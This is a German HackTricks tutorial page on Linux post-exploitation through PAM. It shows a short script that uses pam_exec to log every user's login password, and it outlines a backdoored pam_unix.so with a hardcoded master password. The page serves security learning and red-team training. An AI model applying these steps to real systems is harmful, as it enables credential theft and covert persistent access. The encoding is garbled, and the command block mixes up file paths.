# Linux Post-Exploitation

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

## Sniffing Logon-Passw√∂rter mit PAM

Lassen Sie uns ein PAM-Modul konfigurieren, um jedes Passwort zu protokollieren, das jeder Benutzer zum Anmelden verwendet. Wenn Sie nicht wissen, was PAM ist, √ºberpr√ºfen Sie:

{% content-ref url="pam-pluggable-authentication-modules.md" %}
[pam-pluggable-authentication-modules.md](pam-pluggable-authentication-modules.md)
{% endcontent-ref %}

**F√ºr weitere Details √ºberpr√ºfen Sie den [originalen Beitrag](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)**. Dies ist nur eine Zusammenfassung:

**Technik√ºbersicht:**
Pluggable Authentication Modules (PAM) bieten Flexibilit√§t bei der Verwaltung der Authentifizierung auf Unix-basierten Systemen. Sie k√∂nnen die Sicherheit durch Anpassung der Anmeldeprozesse erh√∂hen, stellen jedoch auch Risiken dar, wenn sie missbraucht werden. Diese Zusammenfassung skizziert eine Technik zur Erfassung von Anmeldeinformationen mit PAM sowie Strategien zur Minderung.

**Erfassung von Anmeldeinformationen:**
- Ein Bash-Skript mit dem Namen `toomanysecrets.sh` wird erstellt, um Anmeldeversuche zu protokollieren, wobei das Datum, der Benutzername (`$PAM_USER`), das Passwort (√ºber stdin) und die IP des Remote-Hosts (`$PAM_RHOST`) in `/var/log/toomanysecrets.log` erfasst werden.
- Das Skript wird ausf√ºhrbar gemacht und in die PAM-Konfiguration (`common-auth`) mit dem Modul `pam_exec.so` integriert, mit Optionen, um leise zu laufen und das Authentifizierungstoken an das Skript weiterzugeben.
- Der Ansatz zeigt, wie ein kompromittierter Linux-Host ausgenutzt werden kann, um Anmeldeinformationen diskret zu protokollieren.
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
sudo nano /etc/pam.d/common-auth
# Add: auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh
sudo chmod 700 /usr/local/bin/toomanysecrets.sh
```
### Backdooring PAM

**F√ºr weitere Details siehe den [originalen Beitrag](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)**. Dies ist nur eine Zusammenfassung:

Das Pluggable Authentication Module (PAM) ist ein System, das unter Linux zur Benutzerauthentifizierung verwendet wird. Es basiert auf drei Hauptkonzepten: **Benutzername**, **Passwort** und **Dienst**. Die Konfigurationsdateien f√ºr jeden Dienst befinden sich im Verzeichnis `/etc/pam.d/`, wo Shared Libraries die Authentifizierung verwalten.

**Ziel**: PAM so modifizieren, dass die Authentifizierung mit einem bestimmten Passwort erfolgt, das das tats√§chliche Benutzerpasswort umgeht. Dies konzentriert sich insbesondere auf die `pam_unix.so` Shared Library, die von der `common-auth` Datei verwendet wird, die von fast allen Diensten zur Passwort√ºberpr√ºfung eingebunden ist.

### Schritte zur Modifizierung von `pam_unix.so`:

1. **Finde die Authentifizierungsanweisung** in der `common-auth` Datei:
- Die Zeile, die f√ºr die √úberpr√ºfung des Benutzerpassworts verantwortlich ist, ruft `pam_unix.so` auf.
2. **Modifiziere den Quellcode**:
- F√ºge eine Bedingung in der Quellcodedatei `pam_unix_auth.c` hinzu, die den Zugriff gew√§hrt, wenn ein vordefiniertes Passwort verwendet wird, andernfalls wird der √ºbliche Authentifizierungsprozess fortgesetzt.
3. **Kompiliere und ersetze** die modifizierte `pam_unix.so` Bibliothek im entsprechenden Verzeichnis.
4. **Testen**:
- Der Zugriff wird √ºber verschiedene Dienste (Login, ssh, sudo, su, Bildschirmschoner) mit dem vordefinierten Passwort gew√§hrt, w√§hrend die normalen Authentifizierungsprozesse unbeeinflusst bleiben.

{% hint style="info" %}
Du kannst diesen Prozess automatisieren mit [https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)
{% endhint %}

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
